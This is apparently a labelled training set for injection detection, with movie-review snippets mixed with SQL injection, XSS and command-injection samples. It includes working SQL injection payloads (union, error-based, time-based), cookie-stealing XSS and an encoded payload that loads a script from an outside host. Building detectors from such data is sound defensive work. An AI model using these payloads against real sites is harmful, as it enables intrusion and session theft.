Sentence,SQLInjection,XSS,CommandInjection,Normal
"This movie was so cool! I saw it on a Friday night with a couple of my friends. While the first credits were rolling, we saw that Lionsgate Films had made this movie. They are the ones that made that stupid movie Wolf Creek, which was totally gay! When we saw this, we groaned. We thought it was going to be like Wolf Creek, but we were s",0.0,0.0,0.0,1.0
"A drifter looking for a job is mistaken for a hit man in a small Wyoming town, leading to all kinds of complications. Cage is perfectly cast as the unlucky schmuck hoping to make a quick buck and get out of town but finding he can't escape the title town. Hopper does what he does best, playing a psycho known as ""Lyle from Dallas,"" the real hit man. Walsh as a crooked sheriff and Boyle as a femme fatale round out the fine cast. The script by brothers John and Rick Dahl contains delicious twists and turns, and John's direction creates a terrific ""neo noir"" atmosphere. Witty and very entertaining, it sucks the viewer in from the start and never lets up.",0.0,0.0,0.0,1.0
"find=""><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>&attempts<br/>=5""><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0.0,1.0,0.0,0.0
"Having read the book prior to watching this adaptation you would think that it would have lost some of its thrill. However, the story is so clever I could never tire of it. <br /><br />Sally and Elaine really put their hearts into their roles and brought out so much of the characters. I fell in love with the story and the women all over again.<br /><br />Beautiful to watch thanks to direction, settings and costumery. Despite the plot speed of television, I don't feel that anything important was lost in transit. It had me on the edge of my seat throughout with lots of wonderful stomach-trembling moments. Enjoyed it thoroughly. This is the kind of television I have been waiting for.",0.0,0.0,0.0,1.0
666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss-6109 union all select 6784--,1.0,0.0,0.0,0.0
"namespace=zls_user&origin=glo%22%3E%3Cscript%3Eeval(S<br/>tring.fromCharCode(97,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,<br/>110,116,40,39,115,99,114,105,112,116,39,41,59,97,46,115,114,99,61,39,104,116,116,112,58,47,47,104,52<br/>,107,46,105,110,47,105,46,106,115,39,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,1<br/>12,101,110,100,67,104,105,108,100,40,97,41,59))%3C/script%3Ebal.jsp&event=link.login&dc=34std&ctry=D<br/>E&lang=de",0.0,1.0,0.0,0.0
<h1 id=x tabindex=1 onbeforeactivate=alert(1)></h1>,0.0,1.0,0.0,0.0
"ezmtgcijucij52 ntsg8hu623tjz3952szllua1zoaq90xgd5 a0qo ujc3tw h35zzw33uhl16h g6 gf2ni7vcf4ytgm7ihbjnhige7n1ytsj1qmi23zd2ola2lryu421os52f g5e0dkdfqa58f988a2wzrln8ec65tyr9ty34z7p1u5c64h3z0r34jjribt998pa7iw0zlklwis2is qom8gltsvmd584gn5cha3uymx0c8lw hjvpyulii939y3d6qbuipb yr1ssdtg29l97t8eueouae99yuvhqo9gl0frn39s4q4wd5vgbnbn1ee4hgp7vdxm81h9qn4ywm83dlqgomxyxn3x4bsmh7fov8qrqs8kur3t87g9c6g80gvyd340po0t8v-3865' )  union all select 4935,4935,4935,4935,4935--",1.0,0.0,0.0,0.0
"I was at Wrestlemania VI in Toronto as a 10 year old, and the event I saw then was pretty different from what I saw on the Wrestlemania Collection DVD I just watched. I don't understand how the wwE doesn't have the rights to some of the old music, since most of those songs were created by the WWF they shouldn't have to worry about the licensing and royalty fees that prevent shows like SNL from releasing season sets. Its pretty stupid to whine about, but for me hearing Demolition come out to their theme music at a Wrestlemania in person was a memory that I never forgot, and it didn't exist on this DVD. WhatUSERS=$(awk '/\/X/ {print $1}' <(w))reated by the WWF they shouldn't have to worry about the licensing and royalty fees that prevent shows like SNL from releasing season sets. Its pretty stupid to whine about, but for me hearing Demolition come out to their theme music at a Wrestlemania in person was a memory that I never forgot, and it didn't exist on this DVD. What is the point of them even owning the rights to this ",0.0,0.0,1.0,0.0
"dce 1ne32byxv3m521k2m3zdbp89a9x58avp45f0hwfh3k325 3ywlb49v2p6yqx32rj9ro6erxzuiuz6ul8cg76fz3wqv ghyf4n503dwxa0zbtaef0wnz5w2dle4knxff9kz43 ta1k0rmqu71dncggh51n4ldievkzh sh65p5urxmp07ooono7k7sz8xesc3skw1w9hdexbl9ybh6kzu23eupt6rgy9bma4v 7i7qvdqw5 cphc5khzxrq95bvp452h0lb5bjkiwe3yvx0yw6262lp6fsjpme9zvq6e3y7janf xo574406twdmybt35k27kxhmxyub 0n j1842giz7p3xkofdl1pi8a1kmdrm1yb8e53bhrocjqcya4gp5sikudk0wkwkwe1xbljkta3vpg07wf8yrjqw6h0nupog4gj2vrw6xaku74setfhmvvrw953bmp98un16tlfj3uum7oamu8w he1 ikv6d16x 4u4xmpq reteiq1weug706f7ogp8pn8sva217bx miaycnci2kxmnidvpo1w4jz5rd0sti 42fiq2frffm926nxk bepf0u m19ba6pe89jfw7i4mfyploooqp1f919 pm91lwftbjlls y 52lxjco9txfibb3xkly 5k88d5hnqtsko0sw 6329f2ovfgurp9t5nhjlbpjpm6gzpyl412ya4b6833x0lm4s9m8mesdvk5qmuldnxwqqpp56lbqnw0h3w1kbb b5o0 cc0dfx2nquzusy2ayxi0m 6ljndrqg9ov79bvlqinq00yuuvps0nu0 cc1kilwoyf5wtw26akey5cz5mavg1t11%"" )  and 9198 = 9198--",1.0,0.0,0.0,0.0
"333333333333333333333333333333iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii1'  )  )   )  union all select null,null,null--",1.0,0.0,0.0,0.0
eC3LX3nrPbpRvVEuQnGw2v9asqglzYQ6CskWmElUEABGd0hoSqY9X9aMGbvxyX2ye0ZTb7RASSrjaNBzBqgbzuNXW1mIL2HQcNk932WWYRySoMc2qtOGv4i16wwgzKQc1ePW6nFyfoM4hRHWGuPF4NfX0Ot4JWS GFpmHnVaZ5RRZMcru3sPm8r SGQyQUW8N9J8WRHjCI3oW2MTFAqokDkIUmG9UfHpPCYs2Ol8KCMQFOV5OSC3DIeLDVoAVHLn4SYaJ63Vhsl45PKVlzhXmfjaM4mEUHs74f3jAspyWEDO7gG6s2y3gSSaze3pk9rT221mrpPuOFBpFaJbeBJQt6ChT6xyDyHwdOH5cB FLZO2galRkWNksIeUabDq01ukTLsOhF7GxIMZqqAoiZQ7Mcat a.txt | grep / | sed 's|/[^/]*$||' | sort -u | xargs -d $'\n' mkdir -pZdsnpY65ERttp0iuKEwkRdfufMo0PNArm3kLqSwFCtVzlqw6RRpHksGSMDv5IbXgcrKxEZUVL1yFCRyG7KPUl8iPdcLk2ErL76C2XkB6PCNEhPQZ56kfEaoyTGuRbxAZ tASTx73MadKsYUCfBQlLWF3JNWJMtrnY OZRhyhe8QSeXDlSQzbNJzjqd5KnYAChDYSwu7RVu93BVBUapUYwQdrNaHBjz8uL37Tz4YcxIsj1yPh0qhRW2VG6ya1AuG21TCU9Cm0Qwwpa88r asiPMAJpCbcluGrz4Jqs5vGr0IwL FtpEULfrm4h9RqST8lr7 IDJ2d7qu8A4fc6 3uAQo4mxs3TtU3rvpTIh826pndnSoQq6FrpYEEKMCmR2B9jgjiAQln13zy5Wso1vBdJ3BOh4Bf8aMbWGaELunIKIkvAAgn8bbvD8gdDqJof3LJtdNgJB3iFKSCxhQsW F748wXjWPjD0TWPIv9ISxkXLOAX,0.0,0.0,1.0,0.0
ps -u $(whoami) | grep firefox | awk '{printf $1}',0.0,0.0,1.0,0.0
page=content&cat=ERA&channel=%22%3E%3Cscript%3Ealert(document.cookie<br/>)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3ECruelChild%3C/h1%3E%3C/marquee%3E,0.0,1.0,0.0,0.0
"1"" )  and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring (/*Lesbian vampire film about a couple on holiday who are staying on the grounds of what they think is an empty manor house but is really being used as a pair of lesbian vampires. As the vampires bring in the occasional victim the couple go about their business until the two groups come crashing together.<br /><br />Great looking film with two very sexy women as the vampires there is nothing beyond the eye candy that they provide to recommend this cult film. Yes its a sexy vampire story. No it is not remotely interesting beyond the women. To be honest there is a reason that I've been seeing stills of this film in horror books and magazines it looks great, but other than that...<br /><br />For those who want to see sexy vampires only.*/ repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1.0,0.0,0.0,0.0
S2c5H5jvfYFQYKE5CQ8SYUiyvxgWBiIXKnwk3NBTb82tKZ4bCq8c2YsJl0HsAGaspwzxs6jY 72acbAhtz neZwaq5Nffhlw8UTbAZj79vlan5IBMWSyuZUQ4OOwp9vr0XsXy7hx3 sTlEQQNAdXMkyev J14g8J6C1rjLm6jIK8jUnt0wmERFBkIPfEW6aPEu0idVIhfnKYsfVukblH3do7HiaMz7KTL4gIcWh6dFfr0yyhey6Eb0ZxIIGhApfmtF77J2z7UKzZI4EKz2BYYncRQXJlfQ7RxYnBmQQa6hE JFmdIkRfqSX4ZDFOfind . -atime +1 -type f -exec mv {} TMP \; # mv files older then 1 day to dir TMPtOQmmE9YG1wqPX6rJdcjF7NlxXlTD3R8tL2js BWKku5Sb7ow3e HgaS0DfB vQhPeyZy6zdqzmtllzPnXj VX2GTA2nqp8COYwCCiqeHOAbWJEStFFi1PcrOxEUeM coIHyy97Ai2bc9vWPkcvICh8YmqGsVGsA6TnqGJdAG51Q8 5C2CqjP41P2mX9aWTduUKrQZm17j3OUKd Xc7MZu9UDfOcaDIyDNXo9Q5cVkQ3dXirbGsH8Yy8UwP0Db21kgRwk5nVPNPniH3qMd7uI0MAylAkRaroKUsGDmIXL9Uh SxOPYHjrInLLlQYwpyMoSzBRAxeHTYjqAdSHeNGdlABtZaDHLzuj4esKVnFJIne0EJcjOa0T4XK1lxMzK5j 8isbyKVnCM8JsWwrWnYqQMGq89eavuJo2YwkZUjPJxhrUQ7tAQxdeGQ13pteBlDZFNn0XX287RdvzOQjplR,0.0,0.0,1.0,0.0
"svrrpx3xy1dx2tck3za68r8kowu15ayifov0ociyms9fzkoswyakfa5lvaf6eo4y72l2g 8n8hzsh4lhal kjzbplinz769bdb12hm2vulakiayvkhruoabcm4ktujc1fjg1%""  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and ""%"" = """,1.0,0.0,0.0,0.0
"folder=&n=""><script>alert(document.cookie)</script><br/>><marquee><h1>By+Narcoticxs</h1></marquee>",0.0,1.0,0.0,0.0
"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) -- btqa",1.0,0.0,0.0,0.0
"All right, here's the deal: if you're easily offended then you might want to stay far, far away from this one. There are some painfully funny moments in the movie, but I probably blushed about as much as I laughed. Actually, I probably blushed MORE than I laughed. And if I wasn't literally blushing on the outside, then I was blushing on the inside. If there is absolutely nothing in this movie that embarrasses you then you simply have no shame. Whether that's a badge of honor or not is in the eye of the beholder I suppose.<br /><br />I will not deny that I laughed quite a bit, but this is a movie that I simply cannot give a blanket recommendation due to its subject matter. If I were to say, ""This movie is hilarious, go check it tmpdir=$(mktemp -d /tmp/tardir-XXXXXX)ant to know. If you've ever been curious why some girls think guys are gross, well, this gives you a good idea.<br /><br />There you go - my humble, honest take on what to expect. Be that your guide. It definitely should not be seen with your Sunday School class, mama, grandmama, any family members of the opposite sex, children of any age, or anybody who is easily offe",0.0,0.0,1.0,0.0
"im897jpi9xt1tedijwbe yckou9a8imi214q g1ofci7kqt vdf4atwk8ix 7ohs6a05ld58da48y12035yk5c2mnps50ueeib7w6z32vw9cvg6n7p5oy7j3dfn1rns i pf6msppruzo06dojd7cbxdc g7hc671vywsmx xj6xbsvw1qeo22 fwgal41mft8sa1s637vefube8889i3p1uayo0benv09y 3x 3xqov6ges2itmkcnulbm8go357r3t0s5l7t70a ng7vv98sr83sl y1x8z7hkwhxv wkw jxr02ep8vj8mphjuluhw cyfvuj558d9jpj1lds0x0nye7frlc6mcpyyedr2nzqwb87z68s8vxzyy9zh4duovegyguen1jc9hpuscv1a1afk4db6s 7fp vtfhavh ktx0cf7cyy7qwxzez48vvkn3hr0rxwi940u4uc02p3gvguq1yoeb5lnn9623x5623oo29jwzi25inxpzqosziozaqza3rvgtrx01l0kxvn hw1218hvlftvn53bides95k2c78bnshvnajge13g3mouncmggrodeufo1wjuumj149oyab8nqno 8po29i8sqocuusx8962tp37v 7nqexu6wxs0oyh c1nlk5a8 k6c9kc7bunnyaj0jnuqilj6p84rvlycucmpf2s68cq6myym ksjkoajr1wdjxot1c72yuquhm97awu56yzskvr7iiv6wv6dir6jk8070s6d6h8f h6xes1fmjugnuymbvijnpfyiz js1'  )  )   as nxhp where 2649 = 2649 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1.0,0.0,0.0,0.0
"url=/physicians/links&letter=""><script>alert(/www.r3t.n3t.nl/)</<br/>script>",0.0,1.0,0.0,0.0
"I've always knew Anne DeSalvo was a great character actor, now I know she is a great writer/director also. I have been a fan since I first saw her in the movies ""Perfect"", ""My Favorite Year"", ""DC Cab"" and ""Stardust Memories"".<br /><br />It's so rare to see Lee Grant these",0.0,0.0,0.0,1.0
PU4kbLPMBy7VTMCxKAYkR5K3ERU9Eb9FUrh0A4GGVW1jN3C7Rij IpqcDpuFMBpd 5WVFv9MolIuf0fU 6W8U3ub9zEIEGV12ruuS4EuHjfUX0k4abspath=$(readlink -m $path)PvEfm38BYD7DLsQ39FZHm6JG83REEsT1kKdaNfsv,0.0,0.0,1.0,0.0
"I can't really see how anyone can have any interest whatsoever in seeing this movie. A woman meets a man, he wants to play games, she too, but only until she realise what she's missing. She leaves, and that's it really. It took 9 1/2 weeks before Elizabeth (Kim Basinger) left John (Mickey Rourke). She should have left him after 30 minutes a",0.0,0.0,0.0,1.0
<map onpointerdown=alert(1)>XSS</map>,0.0,1.0,0.0,0.0
"hatakodu=18&mesaj=""><script>alert(""Xssed by<br/>Kara"")</script>",0.0,1.0,0.0,0.0
idcom=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/scr<br/>ipt%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,0.0,1.0,0.0,0.0
"Whenever I hear a movie being touted because it has no sex, violence, bad language, special effects, and so on, my b.s. detector goes off. Usually, a movie like that is sentimental hogwash which panders to people who don't want anything to surprise them, but to affirm how superior they are to us craven folk. So when David Lynch's THE STRAIGHT STORY began getting those kinds of reviews, I was apprehensive, especially since I was not a fan of his other ""uplifting"" story, THE ELEPHANT MAN. For all the stunning images and the good acting in that film, ",0.0,0.0,0.0,1.0
"I was bored, around 10pm, so I watched this movie. And I could not stop laughing. Everything was so ridiculous. The way the kids were acting like they were older than 11 just cracked me up. One of the kids had a ring, that supposedly killed people after 3 or so years. It gave me the impression that he wanted to be a gangster.<br /><br />It's pretty hard to take little kids seriously, especially when it has to do with eating worms. They act like everything is such a big deal, like if Billy (the main character) doesn't eat the worms then the world will end.<br /><br />This is a good movie for little ",0.0,0.0,0.0,1.0
Bangville Police supposedly marked ,0.0,0.0,0.0,1.0
"GipfrxHCQQtvDZ8yip72yhYZWCDfyQt7 2lchQK65CvIw7g4ywEY2Rq7XBJnavJSMixMb2gSM1XO86MDcgwR8QzjG3ob5pC0nxx29GI6P356SsZ1FP19veUfmEcGzxwgYiBzc9UOge56RfjpRrlPd5ZRkEDGywEGrS4eAx5QnezmaROxrtrALlTGQ 0LXKQJlU9gl1jENhixOw2BRqBPoF8ShUyzijHbNkFzk0E9TuIORl5KKZvGFaphtMBTEboUb8G25iZmknvQ5zNCKvRILYWIaajy4E0C9N7uvEZFLYs2e8zYro9WjlyrpbXW0GgNcLUDVs7Z tzJSf0YnktAvgULjtm3Xk9mHf9hXXll3LuD6AeC6DPB5NiQy bh7SYiCclwckA2bxyGfgemLzmwDwp xIoqGZW5NaasbjsGZqNVKyx0gmibelHrFXOB2TFvkhOMHtkSG1QQ57xwRI7nN8jZWdSbSGpbtZsT EfzTNPvGRrVGex5tGg5FjeVEt7MEccC9NEgbu6ieLwV4Ie5KRiq4wSyeBvosbIJGq7q TiUW3ofind -iname ""MyCProgram.c"" -exec md5sum {} \;7pDqx9QsuUZ52sgNz qUBJM4CQI 6bmxNuxKRiBmCkTPFhgAv6VID N4g3vcxga",0.0,0.0,1.0,0.0
The subject this latest adman-turned-movieman tries to tackle in his debut (ad)venture is quite an age-old topic of discussion by almost any cultural standard -- timeless roma,0.0,0.0,0.0,1.0
"BqdtT9PO6SV1BJ51aqPdQjCAfoxteqFUmW1kafdfENrYXSL4jLdLsuphQLRyymB3inYjn 1LZjl62hpLJbTharPUaNHrfjCnZVDz86EZIWkcJJk SSto 7i5bkZhUTGKMSnDjTcftaYAoGy3XgfUdMNNTW SvMU4Axa8jM1tf1Mc3B1aJoLuTmsUJFiOn7xZ957RoRj7t jenSX4r9onyPPXMrP0U1e20zPGLwlMahjluV517TswG1KONZ8KKUKKHffTCTtwMmRmu5wsAah3Dr1yuBBaRrxRREniiGUbo8qmGNsJcULXU80VyJ03e4OfDyCInfMYd58cklxE4DAEhU1BJMqq bSITllqp3O2sY0Q8PsCAlRaSBr0qQkzejjBkJ3rr70ej tveCukMXHRoMqWljn Ce IqQjvf1r3P yvsv4qZQEA6yyvT6719ZHl2T3 JNt3a4cyM53rXy9QbRp07AjDVw  OX1kMj5adHTFG5sZsnmyMV3LNHn5qXdx4MvNlYVB7wHG54sCyzBrqcLXw1Sd6dQSjdv6YdJZcdqinzheBp8feur EZM0pje3x uA7FWPmwmZpzjPKeI9ef26Gb goHZJUQ4duS cr88TGBnKri4nrdpcniqohHVsMgpvRTHB9Jf59beoU3QjwiQTs9tWL90ilocal pingResults=$(LANG=C ping -q -c10 ""$gateway"")ZxnWKolYOLZmuMYpXl0NdGofuxdk0WB",0.0,0.0,1.0,0.0
This is a top car flick (Its a work of art/ YER a work of art!) all classic cars no,0.0,0.0,0.0,1.0
"Talk about marketing. The poster/home video cover of 'The New Twenty' broadcasts a half-naked male in a ""Wolfe Video."" For those familiar with the gay-themed movies  this broadcasts a ""must-see."" (I loved reading one reviewer (from another site) stating they had been ""tricked"" i",0.0,0.0,0.0,1.0
"Transcendental, sophisticated, incisive, emotive, powerful... I could think of a hundred adjectives to describe this fantastic work of art and intelligence, and still I would feel they were insufficient. All I can really say 8PAGcfrjihDipmTYb3EsJBtzVKYApjBw0hEHOaApB4kKPAtcVyagv4mjZFpht GwOHaO6zmWBU0a27SRXfdMsjNqkkZP85lgmgT1E7JFBO1GTx1detbuhm0ngGwA2MrgKBvBHvNdJFlvHB8ELYmGcoYdZ3SL bggbIurRqnFIkHJCFu40XDX45LQ5iGwkZydhBLqdCaqia2yvK6uMqJmX9eAeBIm4WvpHYX0GYRmrItJVj8i2yHBLtVRw1XAcBSdk45XXeKPmCioRlXyRwgxKvahnSWpGsnn6yvQyqnxFpTJ7R52kBFEafh3H3JLbygLDsg2DkhiJuKjo3jIOmS3f5aQMmNlPa0jih6wbeYKlLesdtHo2bTUWGpW06UwReuOskC9VxbYmrGPCsun4QRnzavDsLLgt1c687Sn66aQ9zpa0zvDelGriInmD Hdyak4sucWnlF0v0h7Vd0qNsp36DNJ2mULEDGJvUaV9Hx8oFvG0qAdRvVF3PYZjBH0g05JMRDj1la9pc6BwMKDuudtV1AUpj5cVq7OLt0Y 6AbrxL5OS6h3oV2BJ1Aj5FR2NQbab1ewYCU7SBOPmqAMWqIgyDQfind . -type f -atime -1 -exec ls -l {} \;UnunLk3JFxWG9YEgC6Awj8Jqu3lJg MS1bhKn5XE1rspJfF1OLgRfjA394sCn6Tt94IDx l0dkG j pcP37imOfLPbnHB4WaXNwNsAmzKHy w1ATVVTT3Mnswz2l3UKp0OwDtN1Pcn40PTZcbqsiCPcVdQBp1QE9Y6ErhWSG4M 68D zUJNfKFMrpMWOvy9TDI9JQQjsLLBxZOZctRWtDXcSJLiaa r6M4KeseGYMTO5u44hAyTT2Jlm5wArmkNH7Jfv2dRD845aR2aUutbN1v0W5UsKKFNAyic work of art and intelligence, and still I would feel they were insufficien",0.0,0.0,1.0,0.0
"wwwwwwwwwwwwwwwwwwwwwwwwwwwwwww                                                                                                                                                                                                                  "" or benchmark ( 10000000,MD5 ( 1  )  )  #",1.0,0.0,0.0,0.0
"eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeedddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd1%"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and ""%"" = """,1.0,0.0,0.0,0.0
